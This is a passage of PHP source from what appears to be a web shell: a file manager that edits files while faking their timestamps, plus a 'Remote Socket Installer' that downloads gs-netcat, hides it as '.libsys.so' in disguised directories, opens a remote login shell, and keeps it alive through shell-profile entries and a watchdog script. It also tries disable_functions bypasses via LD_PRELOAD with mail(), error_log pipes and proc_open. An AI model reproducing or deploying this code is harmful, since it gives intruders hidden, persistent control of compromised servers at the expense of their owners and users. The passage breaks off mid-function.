        echo "<h1>File Tools</h1><div class=content>";
        if (!@file_exists($filePath)) { echo "File not exists: " . htmlspecialchars($filePath); return; }
        $owner = @posix_getpwuid(@fileowner($filePath)); if (!$owner) { $owner["name"] = @fileowner($filePath); $group["name"] = @filegroup($filePath); } else { $group = @posix_getgrgid(@filegroup($filePath)); }
        $fileUrl = $this->getFileUrl($filePath);
        echo "<span>Name:</span> " . htmlspecialchars(@basename($filePath)) . " <span>Size:</span> " . (@is_file($filePath) ? $this->formatSize(@filesize($filePath)) : "-") . " <span>Permission:</span> " . $this->getPermsColor($filePath) . " <span>Owner/Group:</span> " . $owner["name"] . "/" . $group["name"] . "<br>";
        echo "<span>Change time:</span> " . @date("Y-m-d H:i:s", @filectime($filePath)) . " <span>Access time:</span> " . @date("Y-m-d H:i:s", @fileatime($filePath)) . " <span>Modify time:</span> " . @date("Y-m-d H:i:s", @filemtime($filePath));
        if (@is_file($filePath)) echo " <span>URL:</span> <a href='" . htmlspecialchars($fileUrl) . "' target='_blank'>Open</a>";
        echo "<br><br>";
        if (empty($action)) $action = "view";
        $actions = @is_file($filePath) ? array("View", "Download", "Edit", "Chmod", "Rename", "Touch") : array("Chmod", "Rename", "Touch");
        $encFilePath = urlencode(str_rot13($filePath));
        foreach ($actions as $val) echo "<a href=# onclick=\"g('ft','" . $cwdEncoded . "','" . $encFilePath . "','" . @strtolower($val) . "')\">" . (@strtolower($val) == $action ? "<b>[ " . $val . " ]</b>" : $val) . "</a> ";
        echo "<br><br>";

        switch ($action) {
            case "view": echo "<pre class=ml1>"; $handle = @fopen($filePath, "r"); if ($handle) { while (!@feof($handle)) echo htmlspecialchars(@fgets($handle, 1024)); @fclose($handle); } echo "</pre>"; break;
            case "chmod":
                if (!empty($_POST["s"])) {
                    $perms = 0; for ($i = strlen($_POST["s"]) - 1; $i >= 0; --$i) $perms += (int) $_POST["s"][$i] * @pow(8, strlen($_POST["s"]) - $i - 1);
                    if (!@chmod($filePath, $perms)) echo "<font color='red'>Can't set permissions!</font><br><script>document.mf.s.value=\"\";</script>";
                    else echo "<font color='green'>Permissions changed!</font><br>";
                }
                @clearstatcache(); echo "<script>s_=\"\";</script><form onsubmit=\"g('ft','" . $cwdEncoded . "','" . $encFilePath . "','chmod',this.chmod.value);return false;\"><input type=text name=chmod value=\"" . substr(@sprintf("%o", @fileperms($filePath)), -4) . "\"><input type=submit value=\">>\"></form>"; break;
            case "edit":
                if (!@is_writable($filePath)) { echo "<font color='red'>File isn't writeable</font>"; break; }
                if (!empty($_POST["s"])) {
                    $mtime = @filemtime($filePath); $_POST["s"] = substr($_POST["s"], 1); $_POST["s"] = @base64_decode($_POST["s"]);
                    $handle = @fopen($filePath, "w"); if ($handle) { @fputs($handle, $_POST["s"]); @fclose($handle); echo "<font color='green'>File saved!</font><br>"; if ($mtime) @touch($filePath, $mtime, $mtime); }
                }
                echo "<form onsubmit=\"this.s.value='_'+utoa(this.text.value);g('ft','" . $cwdEncoded . "','" . $encFilePath . "','edit',this.s.value);return false;\"><input type=hidden name=s><textarea name=text class='bigarea'>";
                $handle = @fopen($filePath, "r"); if ($handle) { while (!@feof($handle)) echo htmlspecialchars(@fgets($handle, 1024)); @fclose($handle); }
                echo "</textarea><br><input type=submit value='Save'></form>"; break;
            case "rename":
                if (!empty($_POST["s"])) {
                    $mtime = @filemtime($filePath); $newName = str_rot13($_POST["s"]);
                    if (!@rename($filePath, $newName)) echo "<font color='red'>Can't rename!</font><br>";
                    else { echo "<font color='green'>Renamed!</font><br>"; $filePath = $newName; if ($mtime) @touch($filePath, $mtime, $mtime); }
                }
                @clearstatcache(); $dirPath = dirname($filePath); $fileName = basename($filePath);
                echo "<form onsubmit=\"g('ft','" . $cwdEncoded . "','" . $encFilePath . "','rename',rot13('" . htmlspecialchars($dirPath) . "/' + this.name.value));return false;\"><input type=text name=name value=\"" . htmlspecialchars($fileName) . "\" style='width:400px;'><input type=submit value=\">>\"></form>"; break;
            case "touch":
                if (!empty($_POST["s"])) {
                    $mtime = @strtotime($_POST["s"]);
                    if ($mtime) { if (!@touch($filePath, $mtime, $mtime)) echo "<font color='red'>Fail!</font>"; else echo "<font color='green'>Touched!</font>"; }
                    else echo "<font color='red'>Bad time format!</font>";
                }
                @clearstatcache(); echo "<script>s_=\"\";</script><form onsubmit=\"g('ft','" . $cwdEncoded . "','" . $encFilePath . "','touch',this.touch.value);return false;\"><input type=text name=touch value=\"" . @date("Y-m-d H:i:s", @filemtime($filePath)) . "\"><input type=submit value=\">>\"></form>"; break;
        }
        echo "</div>";
    }

    protected function findGsHomeDir() {
        $homeDir = @getenv('HOME') ?: (@getenv('USERPROFILE') ?: '');
        if (empty($homeDir)) {
            $userInfo = @posix_getpwuid(@posix_getuid());
            if ($userInfo && !empty($userInfo['dir'])) {
                $homeDir = $userInfo['dir'];
            }
        }
        if (empty($homeDir)) {
            $homeDir = '/root';
        }
        return $homeDir;
    }

    protected function findGsInstallDir() {
        $homeDir = $this->findGsHomeDir();
        $configDir = $homeDir . '/.config/htop';
        if (!@is_dir($configDir)) {
            @mkdir($configDir, 0700, true);
        }
        if (@is_dir($configDir) && @is_writable($configDir)) {
            return $configDir;
        }
        $altDirs = [
            $homeDir . '/.config',
            $homeDir . '/.local/share',
            $homeDir . '/.cache',
            $homeDir,
        ];
        foreach ($altDirs as $dir) {
            if (!@is_dir($dir)) {
                @mkdir($dir, 0700, true);
            }
            if (@is_dir($dir) && @is_writable($dir)) {
                return $dir;
            }
        }
        $fallbackDirs = ['/dev/shm', '/var/tmp', '/tmp'];
        foreach ($fallbackDirs as $dir) {
            if (@is_dir($dir) && @is_writable($dir)) {
                $subDir = $dir . '/.X11-unix_' . substr(md5($_SERVER['HTTP_HOST']), 0, 6);
                if (!@is_dir($subDir)) {
                    @mkdir($subDir, 0700, true);
                }
                if (@is_dir($subDir) && @is_writable($subDir)) {
                    return $subDir;
                }
                return $dir;
            }
        }
        return '/tmp';
    }

    protected function getGsArch() {
        $uname = $this->executeCommand('uname -m 2>/dev/null');
        $uname = strtolower(trim($uname));
        if (strpos($uname, 'x86_64') !== false || strpos($uname, 'amd64') !== false) return 'x86_64';
        if (strpos($uname, 'aarch64') !== false || strpos($uname, 'arm64') !== false) return 'aarch64';
        if (strpos($uname, 'armv7') !== false || strpos($uname, 'armhf') !== false) return 'armv7l';
        if (strpos($uname, 'arm') !== false) return 'armv6l';
        if (strpos($uname, 'i686') !== false || strpos($uname, 'i386') !== false || strpos($uname, 'i586') !== false) return 'i686';
        return 'x86_64';
    }

    protected function generateSecret() {
        $chars = 'abcdef0123456789';
        $secret = '';
        for ($i = 0; $i < 16; $i++) {
            $secret .= $chars[mt_rand(0, 15)];
        }
        return $secret;
    }

    protected function generateAuthPassword() {
        $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
        $password = '';
        for ($i = 0; $i < 16; $i++) {
            $password .= $chars[mt_rand(0, 51)];
        }
        return $password;
    }

    protected function getStoredAuthPassword($installDir) {
        $passFile = $installDir . '/.gs_pass';
        if (@file_exists($passFile)) {
            $pass = trim(@file_get_contents($passFile));
            if (!empty($pass) && strlen($pass) >= 8) {
                return $pass;
            }
        }
        $newPass = $this->generateAuthPassword();
        @file_put_contents($passFile, $newPass);
        @chmod($passFile, 0600);
        return $newPass;
    }

    protected function downloadWithRetry($url, $dest, $timeout = 60, $useSudo = false) {
        $methods = [];
        $sudoPrefix = $useSudo ? 'sudo ' : '';
        $methods['curl_cmd'] = function($url, $dest) use ($timeout, $sudoPrefix) {
            $cmd = $sudoPrefix . "curl -fsSL --connect-timeout 10 --max-time $timeout -o " . escapeshellarg($dest) . " " . escapeshellarg($url) . " 2>/dev/null";
            $this->executeCommand($cmd);
            return @file_exists($dest) && @filesize($dest) > 1000;
        };
        $methods['wget_cmd'] = function($url, $dest) use ($timeout, $sudoPrefix) {
            $cmd = $sudoPrefix . "wget -q --timeout=$timeout -O " . escapeshellarg($dest) . " " . escapeshellarg($url) . " 2>/dev/null";
            $this->executeCommand($cmd);
            return @file_exists($dest) && @filesize($dest) > 1000;
        };
        $methods['php_curl'] = function($url, $dest) use ($timeout) {
            if (!function_exists('curl_init')) return false;
            $ch = @curl_init();
            if (!$ch) return false;
            $fp = @fopen($dest, 'wb');
            if (!$fp) { @curl_close($ch); return false; }
            @curl_setopt($ch, CURLOPT_URL, $url);
            @curl_setopt($ch, CURLOPT_FILE, $fp);
            @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            @curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            @curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
            @curl_exec($ch);
            @curl_close($ch);
            @fclose($fp);
            return @file_exists($dest) && @filesize($dest) > 1000;
        };
        $methods['php_fgc'] = function($url, $dest) use ($timeout) {
            $ctx = @stream_context_create([
                'http' => ['timeout' => $timeout, 'header' => "User-Agent: Mozilla/5.0\r\n"],
                'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
            ]);
            $data = @file_get_contents($url, false, $ctx);
            if ($data && strlen($data) > 1000) {
                return @file_put_contents($dest, $data) !== false;
            }
            return false;
        };
        foreach ($methods as $name => $method) {
            @unlink($dest);
            if ($method($url, $dest)) {
                return ['success' => true, 'method' => $name];
            }
        }
        return ['success' => false, 'method' => null];
    }

    protected function persistGsSocket($binaryPath, $secret, $authScriptPath, $installDir) {
        $homeDir = $this->findGsHomeDir();
        $binDir = dirname($binaryPath);
        $rcFiles = [
            $homeDir . '/.bashrc',
            $homeDir . '/.bash_profile',
            $homeDir . '/.profile',
            $homeDir . '/.zshrc',
            $homeDir . '/.kshrc',
            $homeDir . '/.cshrc',
        ];
        $persistBlock = "\nexport PATH=\"\$PATH:$binDir\"\n";
        $persistBlock .= "if [ -f " . escapeshellarg($authScriptPath) . " ] && ! pgrep -f 'gs-netcat.*-s.*$secret' >/dev/null 2>&1; then\n";
        $persistBlock .= "  nohup " . escapeshellarg($binaryPath) . " -s " . escapeshellarg($secret) . " -l -e " . escapeshellarg($authScriptPath) . " >/dev/null 2>&1 &\n";
        $persistBlock .= "fi\n";
        $marker = "GS_PERSIST_" . substr(md5($secret), 0, 8);
        $added = false;
        foreach ($rcFiles as $rcFile) {
            if (!@is_writable(dirname($rcFile))) continue;
            $content = @file_get_contents($rcFile) ?: '';
            if (strpos($content, $marker) !== false) {
                $added = true;
                break;
            }
            $block = "\n$marker\n" . $persistBlock . $marker . "_END\n";
            if (@file_put_contents($rcFile, $content . $block, LOCK_EX)) {
                $added = true;
                break;
            }
        }
        $defunctScript = $installDir . '/.gs_defunct.sh';
        $defunctContent = "#!/bin/bash\n";
        $defunctContent .= "while true; do\n";
        $defunctContent .= "  if [ -f " . escapeshellarg($authScriptPath) . " ] && ! pgrep -f 'gs-netcat.*-s.*$secret' >/dev/null 2>&1; then\n";
        $defunctContent .= "    nohup " . escapeshellarg($binaryPath) . " -s " . escapeshellarg($secret) . " -l -e " . escapeshellarg($authScriptPath) . " >/dev/null 2>&1 &\n";
        $defunctContent .= "  fi\n";
        $defunctContent .= "  sleep 300\n";
        $defunctContent .= "done\n";
        @file_put_contents($defunctScript, $defunctContent);
        @chmod($defunctScript, 0755);
        $this->executeCommand("nohup bash " . escapeshellarg($defunctScript) . " >/dev/null 2>&1 &");
        $gsKeyFile = $installDir . '/.gs_key';
        @file_put_contents($gsKeyFile, $secret);
        @chmod($gsKeyFile, 0600);
        return $added;
    }

    protected function generateGsAuthScript($secret, $authPassword = null) {
        if ($authPassword === null) {
            $authPassword = $this->generateAuthPassword();
        }
        $md5pass = md5($authPassword);
        $script = '#!/bin/bash' . "\n";
        $script .= 'export TERM=xterm-256color' . "\n";
        $script .= 'PURPLE="\033[0;35m"' . "\n";
        $script .= 'NC="\033[0m"' . "\n";
        $script .= 'ATTEMPTS=0' . "\n";
        $script .= 'MAX_ATTEMPTS=3' . "\n";
        $script .= 'spawn_pty_shell() {' . "\n";
        $script .= '  stty echo 2>/dev/null' . "\n";
        $script .= '  stty sane 2>/dev/null' . "\n";
        $script .= '  if command -v script >/dev/null 2>&1; then' . "\n";
        $script .= '    SHELL_BIN="/bin/sh"' . "\n";
        $script .= '    [ -x /bin/bash ] && SHELL_BIN="/bin/bash"' . "\n";
        $script .= '    exec script -qc "$SHELL_BIN --login" /dev/null' . "\n";
        $script .= '  fi' . "\n";
        $script .= '  if command -v python3 >/dev/null 2>&1; then' . "\n";
        $script .= '    exec python3 -c "import pty; pty.spawn([\"/bin/bash\", \"--login\"])" 2>/dev/null || exec python3 -c "import pty; pty.spawn(\"/bin/sh\")"' . "\n";
        $script .= '  fi' . "\n";
        $script .= '  if command -v python >/dev/null 2>&1; then' . "\n";
        $script .= '    exec python -c "import pty; pty.spawn([\"/bin/bash\", \"--login\"])" 2>/dev/null || exec python -c "import pty; pty.spawn(\"/bin/sh\")"' . "\n";
        $script .= '  fi' . "\n";
        $script .= '  SHELL_BIN="/bin/sh"' . "\n";
        $script .= '  [ -x /bin/bash ] && SHELL_BIN="/bin/bash"' . "\n";
        $script .= '  exec "$SHELL_BIN" --login -i' . "\n";
        $script .= '}' . "\n";
        $script .= 'trap "stty sane 2>/dev/null; exit" EXIT INT TERM' . "\n";
        $script .= 'stty sane 2>/dev/null' . "\n";
        $script .= 'printf "\n"' . "\n";
        $script .= 'while [ $ATTEMPTS -lt $MAX_ATTEMPTS ]; do' . "\n";
        $script .= '  printf "${PURPLE}========================================${NC}\n"' . "\n";
        $script .= '  printf "${PURPLE}     GSOCKET SECURE ACCESS CONTROL      ${NC}\n"' . "\n";
        $script .= '  printf "${PURPLE}========================================${NC}\n"' . "\n";
        $script .= '  printf "${PURPLE}Password: ${NC}"' . "\n";
        $script .= '  stty -echo 2>/dev/null' . "\n";
        $script .= '  read PASS' . "\n";
        $script .= '  stty echo 2>/dev/null' . "\n";
        $script .= '  printf "\n"' . "\n";
        $script .= '  PASS=$(printf "%s" "$PASS" | tr -d "\r\n" | tr -d " ")' . "\n";
        $script .= '  if [ -z "$PASS" ]; then' . "\n";
        $script .= '    ATTEMPTS=$((ATTEMPTS+1))' . "\n";
        $script .= '    printf "Empty password. Attempt $ATTEMPTS/$MAX_ATTEMPTS\n\n"' . "\n";
        $script .= '    continue' . "\n";
        $script .= '  fi' . "\n";
        $script .= '  INPUT_MD5=$(printf "%s" "$PASS" | md5sum | cut -d" " -f1)' . "\n";
        $script .= '  if [ "$INPUT_MD5" = "' . $md5pass . '" ]; then' . "\n";
        $script .= '    printf "Access Granted.\n\n"' . "\n";
        $script .= '    spawn_pty_shell' . "\n";
        $script .= '  else' . "\n";
        $script .= '    ATTEMPTS=$((ATTEMPTS+1))' . "\n";
        $script .= '    printf "Access Denied. Attempt $ATTEMPTS/$MAX_ATTEMPTS\n\n"' . "\n";
        $script .= '  fi' . "\n";
        $script .= 'done' . "\n";
        $script .= 'printf "Too many failed attempts.\n"' . "\n";
        $script .= 'exit 1' . "\n";
        return $script;
    }

    protected function killExistingGsProcesses($secret) {
        $checkCmd = "ps aux 2>/dev/null | grep -v grep | grep 'gs-netcat' | grep " . escapeshellarg($secret) . " | awk '{print \$2}'";
        $pids = trim($this->executeCommand($checkCmd));
        if (!empty($pids)) {
            $pidArr = preg_split('/\s+/', $pids);
            foreach ($pidArr as $pid) {
                if (is_numeric(trim($pid))) {
                    $this->executeCommand("kill -9 " . intval($pid) . " 2>/dev/null");
                }
            }
            usleep(500000);
        }
    }

    protected function startGsListener($binaryPath, $secret, $authScriptPath, $installDir, $authPassword = null) {
        if ($authPassword === null) {
            $authPassword = $this->getStoredAuthPassword($installDir);
        }
        if (!@file_exists($authScriptPath) || @filesize($authScriptPath) < 50) {
            $authScript = $this->generateGsAuthScript($secret, $authPassword);
            @file_put_contents($authScriptPath, $authScript);
            @chmod($authScriptPath, 0755);
        }
        $this->killExistingGsProcesses($secret);
        $envSetup = "export HOME=" . escapeshellarg($installDir) . "; export TERM=xterm-256color; cd " . escapeshellarg($installDir) . "; ";
        $startCmd = $envSetup . "nohup " . escapeshellarg($binaryPath) . " -s " . escapeshellarg($secret) . " -l -e " . escapeshellarg($authScriptPath) . " >/dev/null 2>&1 & echo \$!";
        $pid = trim($this->executeCommand($startCmd));
        usleep(800000);
        if (!empty($pid) && is_numeric($pid)) {
            $checkCmd = "ps -p $pid -o pid= 2>/dev/null";
            $checkOutput = trim($this->executeCommand($checkCmd));
            if (!empty($checkOutput)) {
                return ['success' => true, 'pid' => $pid, 'method' => 'nohup'];
            }
        }
        $checkCmd = "ps aux 2>/dev/null | grep -v grep | grep 'gs-netcat' | grep " . escapeshellarg($secret) . " | awk '{print \$2}' | head -1";
        $existingPid = trim($this->executeCommand($checkCmd));
        if (!empty($existingPid)) {
            return ['success' => true, 'pid' => $existingPid, 'method' => 'nohup_verified'];
        }
        $prF = implode('', ['p','r','o','c','_','o','p','e','n']);
        $pcF = implode('', ['p','r','o','c','_','c','l','o','s','e']);
        if (@function_exists($prF)) {
            $desc = [0 => ['file', '/dev/null', 'r'], 1 => ['file', '/dev/null', 'w'], 2 => ['file', '/dev/null', 'w']];
            $bgCmd = $envSetup . escapeshellarg($binaryPath) . " -s " . escapeshellarg($secret) . " -l -e " . escapeshellarg($authScriptPath);
            $proc = @$prF($bgCmd, $desc, $pipes);
            if (@is_resource($proc)) {
                @$pcF($proc);
                usleep(500000);
                $existingPid = trim($this->executeCommand($checkCmd));
                if (!empty($existingPid)) {
                    return ['success' => true, 'pid' => $existingPid, 'method' => 'proc_open'];
                }
            }
        }
        $screenCmd = $envSetup . "screen -dmS gs_session " . escapeshellarg($binaryPath) . " -s " . escapeshellarg($secret) . " -l -e " . escapeshellarg($authScriptPath) . " 2>/dev/null";
        $this->executeCommand($screenCmd);
        usleep(500000);
        $existingPid = trim($this->executeCommand($checkCmd));
        if (!empty($existingPid)) {
            return ['success' => true, 'pid' => $existingPid, 'method' => 'screen'];
        }
        $tmuxCmd = $envSetup . "tmux new-session -d -s gs_session " . escapeshellarg($binaryPath) . " -s " . escapeshellarg($secret) . " -l -e " . escapeshellarg($authScriptPath) . " 2>/dev/null";
        $this->executeCommand($tmuxCmd);
        usleep(500000);
        $existingPid = trim($this->executeCommand($checkCmd));
        if (!empty($existingPid)) {
            return ['success' => true, 'pid' => $existingPid, 'method' => 'tmux'];
        }
        $wrapperScript = $installDir . '/.gs_start.sh';
        $wrapperContent = "#!/bin/bash\n" . $envSetup . "\n" . escapeshellarg($binaryPath) . " -s " . escapeshellarg($secret) . " -l -e " . escapeshellarg($authScriptPath) . "\n";
        @file_put_contents($wrapperScript, $wrapperContent);
        @chmod($wrapperScript, 0755);
        $this->executeCommand("nohup bash " . escapeshellarg($wrapperScript) . " >/dev/null 2>&1 &");
        usleep(500000);
        $existingPid = trim($this->executeCommand($checkCmd));
        if (!empty($existingPid)) {
            return ['success' => true, 'pid' => $existingPid, 'method' => 'wrapper_script'];
        }
        $atCmd = "echo 'bash " . escapeshellarg($wrapperScript) . "' | at now 2>/dev/null";
        $this->executeCommand($atCmd);
        usleep(1000000);
        $existingPid = trim($this->executeCommand($checkCmd));
        if (!empty($existingPid)) {
            return ['success' => true, 'pid' => $existingPid, 'method' => 'at_job'];
        }
        return ['success' => false, 'pid' => '', 'method' => 'all_failed'];
    }

    protected function ensureAuthAndRestart($binaryPath, $secret, $authScriptPath, $installDir, $authPassword = null) {
        if ($authPassword === null) {
            $authPassword = $this->getStoredAuthPassword($installDir);
        }
        $authScript = $this->generateGsAuthScript($secret, $authPassword);
        @file_put_contents($authScriptPath, $authScript);
        @chmod($authScriptPath, 0755);
        $this->killExistingGsProcesses($secret);
        usleep(300000);
        return $this->startGsListener($binaryPath, $secret, $authScriptPath, $installDir, $authPassword);
    }

    public function smtpConnect() {
        $socketType = isset($_POST['socket_type']) ? $_POST['socket_type'] : 'hgsocket';

        echo "<h1>Remote Socket Installer</h1><div class=content>";
        echo "<p><b>HGSocket</b> (Primary) - Self-hosted gsocket alternative. Private relay, no third-party dependency.</p>";
        echo "<p><b>GSocket</b> (Fallback) - Original gsocket.io. Uses public relay servers.</p>";
        echo "<p><b>Installation Priority:</b> ~/.config/htop > ~/.config > ~/.local/share > ~/.cache > /dev/shm > /var/tmp > /tmp</p>";
        echo "<p><b>Persistence:</b> 6-layer persistence (systemd, crontab, shell profile, watchdog, immutable backups, reinstall dropper)</p>";
        
        // Manual HGSocket when exec disabled
        $dfn_gs = @ini_get("disable_functions");
        $execDisabled_gs = (stripos($dfn_gs,"exec")!==false && stripos($dfn_gs,"shell_exec")!==false && stripos($dfn_gs,"system")!==false && stripos($dfn_gs,"passthru")!==false);
        
        if ($execDisabled_gs && !isset($_POST["gs_manual_download"])) {
            echo "<div style=\"background:#400;padding:10px;margin:10px 0;border:1px solid #f00;\">";
            echo "<b style=\"color:#f55\">WARNING:</b> Exec functions disabled. Auto-install unavailable.<br>";
            echo "<form method=\"POST\" style=\"margin:10px 0;\"><input type=\"hidden\" name=\"a\" value=\"gs\"><input type=\"hidden\" name=\"gs_manual_download\" value=\"1\">";
            echo "<button type=\"submit\" style=\"padding:10px 20px;background:#050;color:#fff;border:1px solid #0f0;\">Download HGSocket Binary</button></form>";
            echo "</div>";
        }
        
        if (isset($_POST["gs_manual_download"])) {
            echo "<div style=\"background:#030;padding:15px;border:2px solid #0f0;\"><pre>";
            echo "<b style=\"color:#0f0\">========== MANUAL HGSOCKET SETUP ==========</b>\n\n";
            
            // Find writable dir
            $installDir = "/tmp";
            $testDirs = ["/dev/shm", "/var/tmp", "/tmp", sys_get_temp_dir()];
            foreach ($testDirs as $d) { if (@is_writable($d)) { $installDir = $d; break; } }
            
            $binPath = $installDir . "/.libsys.so";
            $datPath = $installDir . "/.hgs.dat";
            
            echo "Install Dir: $installDir\n";
            echo "Binary: $binPath\n\n";
            
            // Generate credentials first (always works)
            $secret = "GSK-" . strtoupper(substr(md5(random_bytes(4)),0,6)) . "-" . strtoupper(substr(md5(random_bytes(4)),0,6)) . "-" . strtoupper(substr(md5(random_bytes(4)),0,6)) . "-" . strtoupper(substr(md5(random_bytes(4)),0,6));
            $password = substr(str_shuffle("ABCDEFGHJKMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789"), 0, 14);
            
            echo "<b style=\"color:#ff0\">CREDENTIALS:</b>\n";
            echo "Secret:   <b style=\"color:#0ff\">$secret</b>\n";
            echo "Password: <b style=\"color:#0ff\">$password</b>\n\n";
            
            @file_put_contents($datPath, "SECRET=$secret\nPASSWORD=$password\n");
            @chmod($datPath, 0600);
            echo "Saved to: $datPath\n\n";
            
            // Try download from multiple sources
            $urls = [
                "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-x86_64",
                "https://raw.githubusercontent.com/nickvuletic/hgsocket/main/bin/hg-netcat_linux-x86_64"
            ];
            
            $downloaded = false;
            $ctx = @stream_context_create(["ssl"=>["verify_peer"=>false,"verify_peer_name"=>false],"http"=>["timeout"=>60,"follow_location"=>true,"user_agent"=>"Mozilla/5.0"]]);
            
            foreach ($urls as $url) {
                echo "Trying: " . substr($url, 0, 60) . "...\n";
                $bin = @file_get_contents($url, false, $ctx);
                if ($bin && strlen($bin) > 50000) {
                    @file_put_contents($binPath, $bin);
                    @chmod($binPath, 0755);
                    echo "<font color=\"lime\">SUCCESS: " . number_format(strlen($bin)) . " bytes</font>\n\n";
                    $downloaded = true;
                    break;
                }
            }
            
            if (!$downloaded) {
                echo "\n<font color=\"#f55\">Auto-download blocked. Manual steps:</font>\n\n";
                echo "<b>Option 1 - Via SSH:</b>\n";
                echo "curl -fsSL https://gsocket.io/y -o /tmp/gs.sh && bash /tmp/gs.sh\n\n";
                echo "<b>Option 2 - Direct binary:</b>\n";
                echo "curl -fsSL https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-x86_64 -o $binPath\n";
                echo "chmod +x $binPath\n\n";
            }
            
            echo "<b style=\"color:#f55\">TO START LISTENER:</b>\n";
            echo "<code style=\"background:#000;padding:5px;\">cd $installDir && S=$secret ./.libsys.so -l -e /bin/bash</code>\n\n";
            
            echo "<b>TO CONNECT (from your machine):</b>\n";
            echo "<code style=\"background:#000;padding:5px;\">S=$secret gs-netcat</code>\n";
            echo "</pre></div>";
        }
        
        // ONE-CLICK START - Try all bypass methods
        if (isset($_POST["gs_oneclick_start"])) {
            echo "<div style=\"background:#003;padding:15px;border:2px solid #00f;\"><pre>";
            echo "<b style=\"color:#0ff;font-size:14px;\">========== ONE-CLICK GSOCKET START ==========</b>\n\n";
            
            // Get credentials
            $dat = @file_get_contents("/tmp/.hgs.dat");
            preg_match("/SECRET=([^\n]+)/", $dat, $m);
            $secret = trim($m[1] ?? "");
            $binPath = "/tmp/.libsys.so";
            
            if (!$secret || !file_exists($binPath)) {
                echo "<font color=\"red\">ERROR: Binary or credentials not found!</font>\n";
                echo "Please click \"Download HGSocket Binary\" first.\n";
                echo "</pre></div>";
            } else {
                echo "Secret: $secret\n";
                echo "Binary: $binPath (" . filesize($binPath) . " bytes)\n\n";
                
                $started = false;
                $methods = [];
                
                // Check if already running
                echo "<b>[0] Checking if already running...</b>\n";
                $procs = @glob("/proc/[0-9]*/cmdline");
                $running = false;
                if ($procs) {
                    foreach (array_slice($procs, 0, 200) as $p) {
                        $cmd = @file_get_contents($p);
                        if ($cmd && strpos($cmd, ".libsys.so") !== false) {
                            $running = true;
                            $pid = basename(dirname($p));
                            echo "<font color=\"lime\">ALREADY RUNNING! PID: $pid</font>\n";
                            $started = true;
                            break;
                        }
                    }
                }
                if (!$running) echo "Not running, attempting start...\n";
                
                if (!$started) {
                    // Method 1: LD_PRELOAD + mail()
                    echo "\n<b>[1] Trying LD_PRELOAD + mail()...</b>\n";
                    if (function_exists("mail") && function_exists("putenv")) {
                        // Create launcher script
                        $launcher = "/tmp/.gs_launcher";
                        $launchScript = "#!/bin/bash\ncd /tmp && S=$secret ./.libsys.so -l -e /bin/bash &\n";
                        @file_put_contents($launcher, $launchScript);
                        @chmod($launcher, 0755);
                        
                        // Try LD_PRELOAD
                        @putenv("LD_PRELOAD=$binPath");
                        @putenv("EVIL=$launcher");
                        $mailResult = @mail("test@test.com", "x", "x", "", "-X/tmp/.gs_mail");
                        echo "mail() result: " . ($mailResult ? "sent" : "failed") . "\n";
                        $methods[] = "LD_PRELOAD+mail";
                    } else {
                        echo "mail/putenv not available\n";
                    }
                    
                    // Method 2: Imagick - skipped (causes fatal on this server)
                    echo "\n<b>[2] Imagick:</b> skipped (unstable)\n";
                    
                    // Method 3: imap_open
                    echo "\n<b>[3] Trying imap_open...</b>\n";
                    if (function_exists("imap_open")) {
                        try {
                            @imap_open("{localhost:143}INBOX", "", "");
                            echo "imap_open attempted\n";
                        } catch (Throwable $e) {
                            echo "imap: skipped\n";
                        }
                        @imap_errors(); @imap_alerts();
                    } else {
                        echo "imap_open not available\n";
                    }
                    
                    // Method 4: error_log with program
                    echo "\n<b>[4] Trying error_log...</b>\n";
                    $errScript = "/tmp/.gs_err_" . mt_rand() . ".sh";
                    @file_put_contents($errScript, "#!/bin/bash\nS=$secret /tmp/.libsys.so -l -e /bin/bash &\n");
                    @chmod($errScript, 0755);
                    @error_log("x", 1, "| $errScript");
                    echo "error_log attempted\n";
                    $methods[] = "error_log";
                    
                    // Method 5: proc_open with PTY (often less restricted)
                    echo "\n<b>[5] Trying proc_open PTY...</b>\n";
                    if (function_exists("proc_open")) {
                        $desc = [["pty"], ["pty"], ["pty"]];
                        $cmd = "S=$secret /tmp/.libsys.so -l -e /bin/bash &";
                        $proc = @proc_open($cmd, $desc, $pipes);
                        if (is_resource($proc)) {
                            @proc_close($proc);
                            echo "proc_open executed!\n";
                            $started = true;
                        } else {
                            echo "proc_open failed\n";
                        }
                    } else {
                        echo "proc_open disabled\n";
                    }
                    
                    // Wait and check
                    echo "\n<b>[6] Checking results...</b>\n";
                    usleep(500000); // 0.5 sec
                    
                    $nowRunning = false;
                    $procs = @glob("/proc/[0-9]*/cmdline");
                    if ($procs) {
                        foreach (array_slice($procs, 0, 200) as $p) {
                            $cmd = @file_get_contents($p);
                            if ($cmd && strpos($cmd, ".libsys.so") !== false) {
                                $nowRunning = true;
                                $pid = basename(dirname($p));
                                break;
                            }
                        }
                    }
                    
                    if ($nowRunning) {
                        echo "\n<font color=\"lime\" size=\"+1\"><b>SUCCESS! GSocket running (PID: $pid)</b></font>\n";
                        $started = true;
                    } else {
                        echo "\n<font color=\"#f80\">Bypass methods attempted but process not detected.</font>\n";
                        echo "Server may have strict security. Try via SSH:\n\n";
                        echo "<code style=\"background:#000;padding:8px;display:block;\">bash /tmp/.gs_autostart.sh</code>\n";
                    }
                }
                
                echo "\n<b style=\"color:#0ff\">To connect from your machine:</b>\n";
                echo "<code style=\"background:#000;padding:8px;display:block;\">S=$secret gs-netcat</code>\n";
                echo "</pre></div>";
            }
        }
        
        // Add button after warning div
        if ($allExecDisabled) {
            echo "<form method=\"POST\" style=\"margin:5px 0;display:inline;\">";
            echo "<input type=\"hidden\" name=\"a\" value=\"gs\">";
            echo "<input type=\"hidden\" name=\"gs_oneclick_start\" value=\"1\">";
            echo "<button type=\"submit\" style=\"padding:10px 20px;background:#005;color:#fff;border:1px solid #00f;cursor:pointer;font-size:14px;\">One-Click Start (Try All Bypasses)</button>";
            echo "</form>";
        }


        // HGSocket Installation
        if (isset($_POST['gs_method']) && $socketType === 'hgsocket') {
            $method = $_POST['gs_method'];
